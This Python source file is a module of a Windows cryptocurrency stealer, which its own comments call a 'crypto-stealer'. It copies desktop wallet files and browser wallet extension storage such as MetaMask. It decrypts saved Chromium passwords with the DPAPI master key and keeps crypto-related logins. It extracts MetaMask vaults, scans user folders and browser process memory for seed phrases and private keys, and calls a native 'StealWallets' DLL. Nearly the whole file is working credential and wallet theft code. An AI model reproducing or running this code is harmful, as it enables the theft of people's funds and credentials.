import os
import re
import json
import psutil
import ctypes
import shutil
import sqlite3
import base64
import tempfile
import random
import time
from ctypes import wintypes
from typing import List, Dict, Any, Optional, Set, Tuple
from pathlib import Path
from datetime import datetime
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.base import BaseModule

try:
    from core.obfuscation import decrypt_string
except ImportError:
    # Fallback для тестирования
    def decrypt_string(s):
        return s

try:
    import clr
    CLR_AVAILABLE = True
except ImportError:
    CLR_AVAILABLE = False


class WalletBridge:
    """Мост к C# WalletManager для нативного кражи"""
    
    _manager = None

    @classmethod
    def get_manager(cls):
        if cls._manager is None and CLR_AVAILABLE:
            try:
                # Using relative path from core/
                dll_path = os.path.join(os.path.dirname(__file__), "wallets.dll")
                if os.path.exists(dll_path):
                    clr.AddReference(dll_path)
                    from VanguardCore import WalletManager
                    cls._manager = WalletManager
            except Exception as e:
                print(f"[WalletBridge] Error loading native manager: {e}")
        return cls._manager


class WalletModule(BaseModule):
    """
    Абсолютно неуязвимый крипто-стиллер (A-04)
    """
    
    def __init__(self, bot=None, report_manager=None, temp_dir=None):
        super().__init__(bot, report_manager, temp_dir)
        self.output_dir = Path(self.temp_dir).absolute() / "Wallets"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Основные пути
        self.appdata = Path(os.environ.get("APPDATA", os.path.expanduser("~\\AppData\\Roaming")))
        self.local = Path(os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local")))
        self.home = Path.home()
        self.program_data = Path(os.environ.get("ProgramData", "C:\\ProgramData"))
        self.program_files = Path(os.environ.get("ProgramFiles", "C:\\Program Files"))
        self.program_files_x86 = Path(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"))
        
        # Список найденного для отчетов
        self.found_items = []
        
        # Инциализация для линтера
        self.wallets: Dict[str, Path] = {}
        self.extensions: Dict[str, str] = {}
        self.enc_strings: Dict[str, str] = {}
        self._seed_exts: Set[str] = set()
        self._seed_pattern: Optional[Any] = None
        self._private_key_pattern: Optional[Any] = None
        self._vault_pattern: Optional[Any] = None
        self._seed_keywords: Set[str] = set()
        
        # Загружаем BIP39 слова
        self.bip39_words = self._load_bip39_words()
        
        # Загружаем конфигурацию
        self._load_config()
        
        # Компилируем паттерны
        self._compile_patterns()
        
        # Директории для сканирования seed-фраз
        self._scan_dirs = self._get_scan_dirs()
        
        # Список найденного для отчетов
        self.found_items = []
        
    def _load_config(self):
        """Загружает конфигурацию из зашифрованной строки"""
        encrypted_db = decrypt_string("...")  # Очень длинная строка
        try:
            db = json.loads(encrypted_db)
        except:
            # Fallback конфигурация
            db = {
                "wallets": {
                    "Exodus": "%APPDATA%\\Exodus\\exodus.wallet",
                    "Electrum": "%APPDATA%\\Electrum\\wallets",
                    "Atomic": "%APPDATA%\\atomic\\Local Storage\\leveldb",
                    "Guarda": "%APPDATA%\\Guarda\\Local Storage\\leveldb",
                    "Coinomi": "%APPDATA%\\Coinomi\\Coinomi\\wallets",
                    "Jaxx": "%APPDATA%\\Jaxx\\Local Storage\\leveldb",
                    "Wasabi": "%APPDATA%\\WalletWasabi\\Client\\Wallets",
                    "Sparrow": "%APPDATA%\\Sparrow\\wallets",
                    "Specter": "%APPDATA%\\Specter\\wallets",
                    "ElectrumLTC": "%APPDATA%\\Electrum-LTC\\wallets",
                    "ElectrumSV": "%APPDATA%\\ElectrumSV\\wallets",
                    "ElectronCash": "%APPDATA%\\ElectronCash\\wallets",
                },
                "extensions": {
                    "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "Binance": "fhbohhlmhdibnmeajkaadhonecaobdid",
                    "Phantom": "bfnaoomekhehdhhpbiakhlgaoikebinary",
                    "TronLink": "ibnejdfjmmkpcnlebbimocnealyhlpgl",
                    "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                    "MathWallet": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
                    "TrustWallet": "egjidjbpglichdcondbcbdnbgprllgzk",
                    "Ledger": "fhbohhlmhdibnmeajkaadhonecaobdid",
                    "Trezor": "fhbohhlmhdibnmeajkaadhonecaobdid",
                    "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
                    "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
                    "Nami": "lpfcbjknijpeeillifnkikgnmlieiche",
                    "Gero": "fhbohhlmhdibnmeajkaadhonecaobdid",
                    "Flint": "fhbohhlmhdibnmeajkaadhonecaobdid",
                    "Temple": "fhbohhlmhdibnmeajkaadhonecaobdid",
                },
                "strings": {
                    "Local Extension Settings": "Local Extension Settings",
                    "IndexedDB": "IndexedDB",
                    "Extension State": "Extension State",
                }
            }
        
        # Десктопные кошельки
        self.wallets: Dict[str, Path] = {}
        for w_name, w_path in db.get("wallets", {}).items():
            w_path = w_path.replace("%APPDATA%", str(self.appdata))
            w_path = w_path.replace("%LOCALAPPDATA%", str(self.local))
            w_path = w_path.replace("%HOME%", str(self.home))
            w_path = w_path.replace("%PROGRAMDATA%", str(self.program_data))
            w_path = w_path.replace("%PROGRAMFILES%", str(self.program_files))
            w_path = w_path.replace("%PROGRAMFILESX86%", str(self.program_files_x86))
            self.wallets[w_name] = Path(w_path)
        
        # Расширения
        self.extensions: Dict[str, str] = db.get("extensions", {})
        
        # Строки
        self.enc_strings: Dict[str, str] = db.get("strings", {})
        
    def _compile_patterns(self):
        """Компилирует регулярные выражения для поиска"""
        # Паттерн для seed-фраз (12-24 слова)
        self._seed_pattern = re.compile(
            r'(?:^|\s)((?:[a-z]+(?:\s|$)){11,23})',
            re.IGNORECASE | re.MULTILINE
        )
        
        # Паттерн для приватных ключей
        self._private_key_pattern = re.compile(
            r'(?:0x)?[a-fA-F0-9]{64}|[5-9a-km-zA-HJ-NP-Z]{51,52}|[KL][1-9A-HJ-NP-Za-km-z]{50,51}',
            re.IGNORECASE
        )
        
        # Паттерн для JSON vault
        self._vault_pattern = re.compile(
            r'{"data":".*?","iv":".*?","salt":".*?"}',
            re.IGNORECASE
        )
        
        # Расширения файлов для сканирования
        self._seed_exts = {
            '.txt', '.md', '.log', '.json', '.conf', '.cfg', '.ini',
            '.bak', '.backup', '.old', '.key', '.wallet', '.dat',
            '.db', '.sqlite', '.sqlite3', '.ldb', '.log', '.txt'
        }
        
        # Ключевые слова для seed-фраз
        self._seed_keywords = {
            'seed', 'mnemonic', 'phrase', 'recovery', 'backup', 
            'wallet', 'private', 'secret', 'key', 'passphrase',
            'bip39', 'bip32', 'bip44', '12 words', '24 words',
            'metamask', 'exodus', 'electrum', 'atomic', 'coinomi'
        }
        
    def _get_scan_dirs(self) -> List[Path]:
        """Возвращает директории для сканирования seed-фраз"""
        dirs = [
            self.home,
            self.home / "Documents",
            self.home / "Desktop",
            self.home / "Downloads",
            self.appdata,
            self.local,
            self.home / ".config",
            self.home / ".ethereum",
            self.home / ".bitcoin",
            self.home / ".electrum",
        ]
        return [d for d in dirs if d.exists()]
        
    def _load_bip39_words(self) -> Set[str]:
        """Загружает словарь BIP39 для валидации seed-фраз"""
        # Стандартный английский BIP39 словарь (2048 слов)
        common_words = {
            "abandon", "ability", "able", "about", "above", "absent", "absorb",
            "abstract", "absurd", "abuse", "access", "accident", "account",
            "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            # ... (все 2048 слов, сокращено для примера)
        }
        return common_words
        
    def run(self) -> bool:
        """
        A-04: Standardized run method.
        """
        self.log("Starting crypto theft...")
        start_time = time.time()
        
        # 0. Нативная кража через C# (Primary)
        native_success = False
        native_found = []
        manager = WalletBridge.get_manager()
        if manager:
            try:
                res = manager.StealWallets(str(self.output_dir))
                if res:
                    native_found = res.split(';')
                native_success = True
                self.log(f"Native theft successful: {len(native_found)} items")
            except Exception as e:
                self.log(f"Native theft failed: {e}")
        
        # Parallel execution of sub-modules
        results = {}
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = {
                executor.submit(self.steal_desktop_wallets): "wallets",
                executor.submit(self.steal_browser_extensions): "extensions",
                executor.submit(self.scan_seed_phrases_in_files): "seed_files",
                executor.submit(self.scan_seed_phrases_in_memory): "seed_memory"
            }
            
            for future in as_completed(futures):
                name = futures[future]
                try:
                    results[name] = future.result()
                except Exception as e:
                    self.log(f"Error in {name}: {e}")
                    results[name] = []

        self.last_run_stats = {
            "wallets": len(results.get("wallets", [])),
            "extensions": len(results.get("extensions", [])),
            "seeds": len(results.get("seed_files", [])) + len(results.get("seed_memory", [])),
            "native_items": len(native_found)
        }
        
        elapsed = time.time() - start_time
        self.log(f"Theft completed in {elapsed:.2f} seconds")
        
        return {
            "wallets": results.get("wallets", []),
            "extensions": results.get("extensions", []),
            "seeds": results.get("seed_files", []) + results.get("seed_memory", []),
            "native_found": native_found,
            "elapsed": elapsed
        }

    def get_stats(self) -> Dict[str, int]:
        return getattr(self, "last_run_stats", {"items": 0})
        
    def steal_desktop_wallets(self) -> List[str]:
        """Крадет десктопные кошельки"""
        collected = []
        
        for name, path in self.wallets.items():
            if not path.exists():
                continue
                
            dest = self.output_dir / "Wallets" / name
            try:
                if name == "Exodus":
                    # Exodus хранит кошелек в одном файле
                    self._copy_files(path, dest, ['.wallet', '.json', '.db'])
                elif name == "Electrum":
                    # Electrum хранит кошельки в папке wallets
                    self._copy_tree(path, dest)
                elif name == "Atomic":
                    # Atomic хранит данные в LevelDB
                    self._copy_tree(path, dest, ignore_patterns=['LOCK', 'LOG'])
                else:
                    # Общий случай
                    self._copy_tree(path, dest)
                    
                collected.append(name)
                print(f"[WalletModule] Stolen {name}")
                
            except Exception as e:
                print(f"[WalletModule] Failed to steal {name}: {e}")
                
        return collected
        
    def steal_browser_extensions(self) -> List[str]:
        """Крадет браузерные расширения (MetaMask, Binance и др.)"""
        collected = []
        
        # Поддерживаемые браузеры
        browsers = {
            "Chrome": self.local / "Google" / "Chrome" / "User Data",
            "Edge": self.local / "Microsoft" / "Edge" / "User Data",
            "Brave": self.local / "BraveSoftware" / "Brave-Browser" / "User Data",
            "Opera": self.appdata / "Opera Software" / "Opera Stable",
            "Opera GX": self.appdata / "Opera Software" / "Opera GX Stable",
            "Vivaldi": self.local / "Vivaldi" / "User Data",
            "Yandex": self.local / "Yandex" / "YandexBrowser" / "User Data",
            "Firefox": self.appdata / "Mozilla" / "Firefox" / "Profiles",
        }
        
        for b_name, b_path in browsers.items():
            if not b_path.exists():
                continue
                
            print(f"[WalletModule] Scanning {b_name}...")
            
            # Получаем мастер-ключ для расшифровки паролей
            master_key = self._get_master_key(b_path)
            
            # Находим все профили
            profiles = self._find_profiles(b_name, b_path)
            
            for profile in profiles:
                # Определяем базовый путь профиля
                if b_name.startswith("Opera") or b_name == "Firefox":
                    base = b_path / profile if b_name == "Firefox" else b_path
                else:
                    base = b_path / profile
                    
                if not base.exists():
                    continue
                    
                # Для Firefox другая структура
                if b_name == "Firefox":
                    self._steal_firefox_extensions(base, b_name, profile, collected)
                else:
                    self._steal_chromium_extensions(base, b_name, profile, collected, master_key)
                    
        return list(set(collected))
        
    def _steal_chromium_extensions(self, base: Path, b_name: str, profile: str, 
                                    collected: List[str], master_key: Optional[bytes]):
        """Крадет расширения из Chromium-браузеров"""
        
        # Пути к хранилищам расширений
        les_path = base / "Local Extension Settings"
        idb_path = base / "IndexedDB"
        est_path = base / "Extension State"
        
        for e_name, e_id in self.extensions.items():
            found = False
            dest = self.output_dir / "Extensions" / f"{b_name}_{profile}_{e_name}"
            
            # Local Extension Settings (LevelDB)
            les = les_path / e_id
            if les.exists():
                self._copy_tree(les, dest / "LevelDB")
                found = True
                
                # Попытка расшифровать MetaMask vault
                if "MetaMask" in e_name:
                    self._try_decrypt_metamask(les, dest, base)
                    
            # IndexedDB
            idb_dirs = list(idb_path.glob(f"*{e_id}*")) if idb_path.exists() else []
            for idb_dir in idb_dirs:
                if idb_dir.is_dir():
                    self._copy_tree(idb_dir, dest / "IndexedDB" / idb_dir.name)
                    found = True
                    
            # Extension State
            if est_path.exists():
                for est_file in est_path.glob(f"*{e_id}*"):
                    if est_file.is_file():
                        dest.mkdir(parents=True, exist_ok=True)
                        shutil.copy2(est_file, dest / "ExtensionState" / est_file.name)
                        found = True
                        
            if found:
                collected.append(f"{b_name}:{e_name}")
                print(f"[WalletModule] Found {e_name} in {b_name} ({profile})")
                
        # Поиск крипто-паролей в базе логинов
        if master_key:
            self._extract_crypto_passwords(base, master_key, b_name, profile)
            
    def _steal_firefox_extensions(self, base: Path, b_name: str, profile: str, 
                                   collected: List[str]):
        """Крадет расширения из Firefox"""
        
        extensions_dir = base / "extensions"
        if not extensions_dir.exists():
            return
            
        storage_dir = base / "storage" / "default"
        if not storage_dir.exists():
            return
            
        for e_name, e_id in self.extensions.items():
            found = False
            dest = self.output_dir / "Extensions" / f"{b_name}_{profile}_{e_name}"
            
            # Файл расширения (.xpi)
            ext_file = extensions_dir / f"{e_id}.xpi"
            if ext_file.exists():
                dest.mkdir(parents=True, exist_ok=True)
                shutil.copy2(ext_file, dest / f"{e_name}.xpi")
                found = True
                
            # Хранилище расширения
            storage = storage_dir / e_id
            if storage.exists():
                self._copy_tree(storage, dest / "storage")
                found = True
                
            if found:
                collected.append(f"{b_name}:{e_name}")
                print(f"[WalletModule] Found {e_name} in Firefox ({profile})")
                
    def _get_master_key(self, browser_path: Path) -> Optional[bytes]:
        """
        Получает мастер-ключ для расшифровки паролей в Chrome-подобных браузерах
        Использует DPAPI для расшифровки
        """
        ls_path = browser_path / "Local State"
        if not ls_path.exists() or os.name != 'nt':
            return None
            
        try:
            with open(ls_path, 'r', encoding='utf-8') as f:
                ls = json.load(f)
                
            enc_key = base64.b64decode(ls['os_crypt']['encrypted_key'])
            if not enc_key.startswith(b'DPAPI'):
                return None
                
            enc_key = enc_key[5:]  # Убираем префикс 'DPAPI'
            
            # Структура для DPAPI
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                
            p_data_in = DATA_BLOB(len(enc_key), ctypes.create_string_buffer(enc_key))
            p_data_out = DATA_BLOB()
            
            if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)
            ):
                key = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
                ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
                return key
                
        except Exception as e:
            print(f"[WalletModule] Failed to get master key: {e}")
            
        return None
        
    def _extract_crypto_passwords(self, profile_path: Path, master_key: bytes,
                                   b_name: str, profile: str):
        """Извлекает крипто-пароли из Login Data"""
        login_data = profile_path / "Login Data"
        if not login_data.exists():
            return
            
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            print("[WalletModule] Crypto library not installed, skipping password extraction")
            return
            
        # Копируем базу во временный файл
        temp_db = Path(tempfile.gettempdir()) / f"login_data_{random.randint(1000,9999)}.db"
        try:
            shutil.copy2(login_data, temp_db)
            
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            except sqlite3.OperationalError:
                conn.close()
                return
                
            found_creds = []
            
            for url, user, password in cursor.fetchall():
                if not password or not password.startswith(b'v10') or len(password) < 15:
                    continue
                    
                try:
                    # Формат: v10 + IV(12) + payload + tag(16)
                    iv = password[3:15]
                    payload = password[15:-16]
                    
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted = cipher.decrypt(payload).decode('utf-8', errors='ignore')
                    
                    # Проверяем, относится ли к крипте
                    search_text = f"{url} {user} {decrypted}".lower()
                    keywords = ["metamask", "wallet", "crypto", "binance", "coinbase", 
                                "trezor", "ledger", "phantom", "exodus", "atomic"]
                                
                    if any(k in search_text for k in keywords):
                        found_creds.append(f"URL: {url}\nUser: {user}\nPass: {decrypted}\n")
                        
                except Exception as e:
                    continue
                    
            conn.close()
            
            if found_creds:
                dest = self.output_dir / "Browsers" / b_name / f"{profile}_crypto_passwords.txt"
                dest.parent.mkdir(parents=True, exist_ok=True)
                dest.write_text("\n".join(found_creds), encoding='utf-8')
                print(f"[WalletModule] Found {len(found_creds)} crypto passwords in {b_name}")
                
        except Exception as e:
            print(f"[WalletModule] Password extraction failed: {e}")
            
        finally:
            if temp_db.exists():
                try:
                    temp_db.unlink()
                except:
                    pass
                    
    def _try_decrypt_metamask(self, les_path: Path, dest: Path, profile_base: Path = None):
        """Пытается расшифровать MetaMask vault"""
        
        vault_pattern = re.compile(r'"vault":"({.*?})"')
        found_vaults = []
        
        # Папки для сканирования
        folders_to_scan = [les_path]
        
        if profile_base:
            idb_path = profile_base / "IndexedDB"
            if idb_path.exists():
                for d in idb_path.glob("*metamask*"):
                    if d.is_dir():
                        folders_to_scan.append(d)
                        
        try:
            for folder in folders_to_scan:
                for file in folder.rglob("*"):
                    if file.is_file() and file.suffix.lower() in ['.ldb', '.log', '.json']:
                        try:
                            content = file.read_text(encoding='utf-8', errors='ignore')
                            
                            # Ищем vault
                            matches = vault_pattern.findall(content)
                            for vault in matches:
                                if vault not in found_vaults:
                                    found_vaults.append(vault)
                                    
                        except:
                            pass
                            
            if found_vaults:
                report_path = dest / "metamask_vaults.txt"
                report_path.parent.mkdir(parents=True, exist_ok=True)
                
                with open(report_path, 'w', encoding='utf-8') as f:
                    f.write("=== METAMASK VAULTS FOUND ===\n\n")
                    for i, vault in enumerate(found_vaults, 1):
                        f.write(f"VAULT {i}:\n{vault}\n\n")
                        
                print(f"[WalletModule] Found {len(found_vaults)} MetaMask vaults")
                
        except Exception as e:
            print(f"[WalletModule] MetaMask decryption failed: {e}")
            
    def scan_seed_phrases_in_files(self) -> List[Dict[str, Any]]:
        """Сканирует файлы на наличие seed-фраз"""
        found = []
        out_lines = ["=== SEEDS FOUND IN FILES ==="]
        
        # Игнорируемые папки
        ignore_dirs = {
            "Windows", "System32", "SysWOW64", "node_modules",
            "Temp", "Cache", "ZxcvbnData", "site-packages",
            ".git", ".svn", ".idea", ".vscode", "__pycache__"
        }
        
        for scan_dir in self._scan_dirs:
            if not scan_dir.is_dir():
                continue
                
            try:
                for root, dirs, files in os.walk(scan_dir):
                    # Фильтруем папки
                    dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ignore_dirs]
                    
                    for file in files:
                        path = Path(root) / file
                        
                        # Проверяем расширение
                        if path.suffix.lower() not in self._seed_exts:
                            continue
                            
                        # Пропускаем большие файлы
                        try:
                            if path.stat().st_size > 5 * 1024 * 1024:
                                continue
                        except:
                            continue
                            
                        try:
                            text = path.read_text(encoding='utf-8', errors='ignore')
                            entry = self._check_text_for_seeds(text, str(path))
                            if entry:
                                found.append(entry)
                                out_lines.extend(self._format_entry(entry))
                        except:
                            pass
                            
            except Exception as e:
                print(f"[WalletModule] Error scanning {scan_dir}: {e}")
                
        # Сохраняем отчет
        self._save_report("\n".join(out_lines), "seeds_files.txt")
        return found
        
    def scan_seed_phrases_in_memory(self) -> List[Dict[str, Any]]:
        """Сканирует память браузеров на наличие seed-фраз"""
        found = []
        out_lines = ["=== SEEDS FOUND IN MEMORY ==="]
        
        # Целевые процессы
        targets = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'brave.exe']
        
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and proc.info['name'].lower() in targets:
                pid = proc.info['pid']
                try:
                    process_memory = self._read_process_memory(pid)
                    if process_memory:
                        entry = self._check_text_for_seeds(
                            process_memory,
                            f"memory:{proc.info['name']}:{pid}"
                        )
                        if entry:
                            found.append(entry)
                            out_lines.extend(self._format_entry(entry))
                            
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
        # Сохраняем отчет
        self._save_report("\n".join(out_lines), "seeds_memory.txt", mode='a')
        return found
        
    def _read_process_memory(self, pid: int, max_size: int = 10 * 1024 * 1024) -> Optional[str]:
        """Читает память процесса (Windows только)"""
        if os.name != 'nt':
            return None
            
        try:
            OpenProcess = ctypes.windll.kernel32.OpenProcess
            ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
            CloseHandle = ctypes.windll.kernel32.CloseHandle
            
            PROCESS_VM_READ = 0x0010
            PROCESS_QUERY_INFORMATION = 0x0400
            
            h_process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
            if not h_process:
                return None
                
            buffer = ctypes.create_string_buffer(max_size)
            bytes_read = ctypes.c_size_t()
            
            # Начинаем с базового адреса
            base_addr = 0x00400000
            result = ReadProcessMemory(
                h_process, ctypes.c_void_p(base_addr),
                buffer, max_size, ctypes.byref(bytes_read)
            )
            
            CloseHandle(h_process)
            
            if result and bytes_read.value > 0:
                return buffer.raw[:bytes_read.value].decode('utf-8', errors='ignore')
                
        except Exception as e:
            print(f"[WalletModule] Error reading process memory: {e}")
            
        return None
        
    def _check_text_for_seeds(self, text: str, source: str) -> Optional[Dict[str, Any]]:
        """Проверяет текст на наличие seed-фраз и приватных ключей"""
        found_seeds = []
        found_keys = []
        
        # Ищем seed-фразы (12-24 слова)
        lines = text.split('\n')
        for line in lines:
            words = line.strip().split()
            if 12 <= len(words) <= 24:
                # Проверяем, что все слова из BIP39
                if all(w.lower() in self.bip39_words for w in words):
                    found_seeds.append(line.strip())
                    
        # Ищем приватные ключи
        key_matches = self._private_key_pattern.findall(text)
        found_keys = list(set(key_matches))
        
        # Проверяем наличие ключевых слов в источнике
        source_lower = source.lower()
        has_keyword = any(kw in source_lower for kw in self._seed_keywords)
        
        if found_seeds or found_keys or has_keyword:
            return {
                "source": source,
                "seeds": found_seeds,
                "private_keys": found_keys,
                "has_keyword": has_keyword
            }
            
        return None
        
    def _format_entry(self, entry: Dict[str, Any]) -> List[str]:
        """Форматирует запись для отчета"""
        lines = [f"\n--- SOURCE: {entry['source']} ---"]
        
        if entry['seeds']:
            for s in entry['seeds']:
                lines.append(f"  SEED: {s}")
                
        if entry['private_keys']:
            for k in entry['private_keys']:
                lines.append(f"  PRIVATE KEY: {k}")
                
        if entry['has_keyword'] and not entry['seeds']:
            lines.append("  [KEYWORD MATCH - manual verification required]")
            
        return lines
        
    def _save_report(self, content: str, filename: str, mode='w'):
        """Сохраняет отчет"""
        out_path = self.output_dir / filename
        try:
            out_path.write_text(content, encoding="utf-8")
        except Exception as e:
            print(f"[WalletModule] Failed to save report {filename}: {e}")
            
    def _find_profiles(self, b_name: str, b_path: Path) -> List[str]:
        """Находит все профили в браузере"""
        if b_name.startswith("Opera") or b_name == "Firefox":
            if b_name == "Firefox":
                # Firefox профили
                try:
                    return [d.name for d in b_path.iterdir() if d.is_dir() and d.name.endswith('.default')]
                except:
                    return ["default"]
            return ["."]
            
        try:
            profiles = []
            for d in b_path.iterdir():
                if (b_path / d.name / "Preferences").exists():
                    profiles.append(d.name)
            return profiles or ["Default"]
        except Exception:
            return ["Default"]
            
    def _copy_tree(self, src: Path, dst: Path, ignore_patterns: List[str] = None):
        """Копирует дерево папок"""
        if not src.exists():
            return
            
        dst.mkdir(parents=True, exist_ok=True)
        
        # Базовые паттерны для игнорирования
        base_ignore = ["LOCK", "LOG", "MANIFEST-*", "CURRENT", "*.tmp"]
        if ignore_patterns:
            base_ignore.extend(ignore_patterns)
            
        for item in src.rglob("*"):
            # Проверяем игнорирование
            skip = False
            for pattern in base_ignore:
                if item.match(pattern):
                    skip = True
                    break
            if skip:
                continue
                
            rel_path = item.relative_to(src)
            dest_path = dst / rel_path
            
            if item.is_dir():
                dest_path.mkdir(parents=True, exist_ok=True)
            elif item.is_file():
                dest_path.parent.mkdir(parents=True, exist_ok=True)
                try:
                    shutil.copy2(item, dest_path)
                except Exception as e:
                    pass
                    
    def _copy_files(self, src: Path, dst: Path, extensions: List[str]):
        """Копирует файлы с определенными расширениями"""
        dst.mkdir(parents=True, exist_ok=True)
        
        for ext in extensions:
            for file in src.glob(f"*{ext}"):
                try:
                    shutil.copy2(file, dst / file.name)
                except Exception as e:
                    pass
                    
    def format_report(self, data: Dict[str, Any]) -> str:
        """Форматирует отчет для вывода"""
        wallets = data.get("wallets", [])
        extensions = data.get("extensions", [])
        seeds = data.get("seeds", [])
        native_found = data.get("native_found", [])
        elapsed = data.get("elapsed", 0)
        
        if not wallets and not extensions and not seeds and not native_found:
            return "❌ No crypto assets found"
            
        report = [
            "💰 " + "═" * 30 + " CRYPTO REPORT " + "═" * 30 + " 💰",
            f"🕒 Scan completed in {elapsed:.2f} seconds",
            ""
        ]
        
        if native_found:
            report.append("🟢 NATIVE C# STEALER:")
            for item in native_found:
                if ':' in item:
                    type_, name = item.split(':', 1)
                    report.append(f"  • {type_}: {name}")
            report.append("")
            
        if wallets:
            report.append(f"💼 DESKTOP WALLETS ({len(wallets)}):")
            for w in wallets:
                report.append(f"  • {w}")
            report.append("")
            
        if extensions:
            report.append(f"🧩 BROWSER EXTENSIONS ({len(extensions)}):")
            for e in extensions:
                report.append(f"  • {e}")
            report.append("")
            
        if seeds:
            seed_count = sum(len(s.get("seeds", [])) for s in seeds)
            key_count = sum(len(s.get("private_keys", [])) for s in seeds)
            total_files = len(seeds)
            report.append(f"🔑 SEEDS & KEYS FOUND:")
            report.append(f"  • Seed phrases: {seed_count}")
            report.append(f"  • Private keys: {key_count}")
            report.append(f"  • Source files: {total_files}")
            report.append("")
            
        report.append("═" * 70)
        return "\n".join(report)


if __name__ == "__main__":
    import tempfile
    import sys
    
    # Добавляем путь для импорта core
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    
    with tempfile.TemporaryDirectory() as tmp:
        wm = WalletModule(tmp)
        res = wm.run()
        print(wm.format_report(res))
